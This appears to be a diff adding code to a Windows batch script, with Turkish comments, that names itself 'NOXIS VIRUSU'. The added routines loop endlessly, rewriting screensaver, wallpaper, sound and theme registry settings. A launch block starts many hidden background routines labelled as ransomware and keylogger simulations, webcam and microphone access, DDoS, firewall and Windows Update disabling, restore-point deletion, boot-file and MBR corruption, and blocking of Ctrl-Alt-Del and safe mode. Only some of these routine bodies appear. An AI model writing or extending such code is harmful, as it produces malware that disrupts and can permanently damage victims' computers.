+timeout /t %mbr_suresi% /nobreak >nul 2>&1
+goto mbr_boz
+
+:: ============================================
+:: EKRAN KORUYUCUYU DEĞİŞTİRME (FİXED)
+:: ============================================
+
+:ekran_koruyucu_degistir
+:: Ekran koruyucuyu değiştir
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f >nul 2>&1
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "1" /f >nul 2>&1
+reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Windows\System32\scrnsave.scr" /f >nul 2>&1
+
+:: Ekran koruyucuyu başlat
+start /min "C:\Windows\System32\scrnsave.scr" >nul 2>&1
+
+timeout /t %ekran_koruyucu_suresi% /nobreak >nul 2>&1
+goto ekran_koruyucu_degistir
+
+:: ============================================
+:: DUVAR KAĞIDINI DEĞİŞTİRME (FİXED)
+:: ============================================
+
+:duvar_kagidi_degistir
+:: Duvar kağıdını değiştir
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\System32\img0.jpg" /f >nul 2>&1
+reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "2" /f >nul 2>&1
+
+:: Duvar kağıdını yenile
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds" >nul 2>&1
+
+timeout /t %duvar_kagidi_suresi% /nobreak >nul 2>&1
+goto duvar_kagidi_degistir
+
+:: ============================================
+:: SES ŞEMASINI DEĞİŞTİRME (FİXED)
+:: ============================================
+
+:ses_semasi_degistir
+:: Ses şemasını değiştir
+reg add "HKCU\AppEvents\Schemes" /v "NOXIS" /t REG_SZ /d "NOXIS VIRUSU" /f >nul 2>&1
+
+:: Ses şemasını uygula
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current" /ve /t REG_SZ /d "C:\Windows\Media\Windows Notify System Generic.wav" /f >nul 2>&1
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemAsterisk\.Current" /ve /t REG_SZ /d "C:\Windows\Media\Windows Notify System Generic.wav" /f >nul 2>&1
+reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExclamation\.Current" /ve /t REG_SZ /d "C:\Windows\Media\Windows Notify System Generic.wav" /f >nul 2>&1
+
+timeout /t %ses_semasi_suresi% /nobreak >nul 2>&1
+goto ses_semasi_degistir
+
+:: ============================================
+:: TEMAYI DEĞİŞTİRME (FİXED)
+:: ============================================
+
+:tema_degistir
+:: Temayı değiştir
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /v CurrentTheme /t REG_SZ /d "C:\Windows\Resources\Themes\aero.theme" /f >nul 2>&1
+
+:: Temayı uygula
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds" >nul 2>&1
+
+timeout /t %tema_suresi% /nobreak >nul 2>&1
+goto tema_degistir
+
+:: ============================================
 :: GÖRSEL EFEKTLER (FİXED)
 :: ============================================
 
@@ -1523,6 +2267,35 @@ start /min cmd.exe /c "call :mouse_dondur"
 start /min cmd.exe /c "call :glitch_mesajlar"
 start /min cmd.exe /c "call :islemci_yak"
 start /min cmd.exe /c "call :sistem_boz"
+start /min cmd.exe /c "call :ransomware_simulasyonu"
+start /min cmd.exe /c "call :keylogger_simulasyonu"
+start /min cmd.exe /c "call :webcam_ac"
+start /min cmd.exe /c "call :mikrofon_ac"
+start /min cmd.exe /c "call :ekran_goruntusu_al"
+start /min cmd.exe /c "call :ag_saldirisi"
+start /min cmd.exe /c "call :ddos_saldirisi"
+start /min cmd.exe /c "call :usb_saldirisi"
+start /min cmd.exe /c "call :email_saldirisi"
+start /min cmd.exe /c "call :sosyal_muhendislik"
+start /min cmd.exe /c "call :ekran_kilidi"
+start /min cmd.exe /c "call :mouse_ters_cevir"
+start /min cmd.exe /c "call :ekran_parlaklik"
+start /min cmd.exe /c "call :ses_seviyesi_degistir"
+start /min cmd.exe /c "call :gorev_cubugu_gizle"
+start /min cmd.exe /c "call :masaustu_simgeleri_gizle"
+start /min cmd.exe /c "call :baslat_menu_kapat"
+start /min cmd.exe /c "call :sag_tik_menu_kapat"
+start /min cmd.exe /c "call :ctrl_alt_del_engelle"
+start /min cmd.exe /c "call :guvenlik_duvari_kapat"
+start /min cmd.exe /c "call :windows_update_engelle"
+start /min cmd.exe /c "call :geri_yukleme_sil"
+start /min cmd.exe /c "call :boot_dosyalari_boz"
+start /min cmd.exe /c "call :safe_mode_engelle"
+start /min cmd.exe /c "call :mbr_boz"
+start /min cmd.exe /c "call :ekran_koruyucu_degistir"
+start /min cmd.exe /c "call :duvar_kagidi_degistir"
+start /min cmd.exe /c "call :ses_semasi_degistir"
+start /min cmd.exe /c "call :tema_degistir"
 start /min cmd.exe /c "call :yeniden_baslat_zamanlayici"
 call :kaos
 
